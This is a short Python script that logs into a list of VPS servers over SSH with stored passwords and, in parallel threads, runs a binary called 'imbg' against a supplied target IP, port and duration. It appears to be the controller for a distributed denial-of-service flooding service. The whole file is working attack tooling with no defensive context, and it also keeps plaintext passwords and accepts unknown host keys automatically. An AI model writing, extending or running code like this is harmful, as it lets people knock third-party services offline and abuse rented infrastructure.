import paramiko, threading, json

VPS = []

def add_vps(ip, user, pw):
    VPS.append({"ip": ip, "user": user, "pass": pw})

def task_runner(vps, cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(vps["ip"], username=vps["user"], password=vps["pass"])
        ssh.exec_command(f"cd freeroot && ./root.sh && cd M && {cmd}")
        ssh.close()
    except Exception as e:
        print(f"[{vps['ip']}] Error: {e}")

def run_task(ip, port, dur):
    cmd = f"./imbg {ip} {port} {dur} 25"
    threads = []
    for vps in VPS[:5]:
        t = threading.Thread(target=task_runner, args=(vps, cmd))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return len(VPS[:5])

def vps_status():
    return f"🖥️ Total VPS: {len(VPS)}"
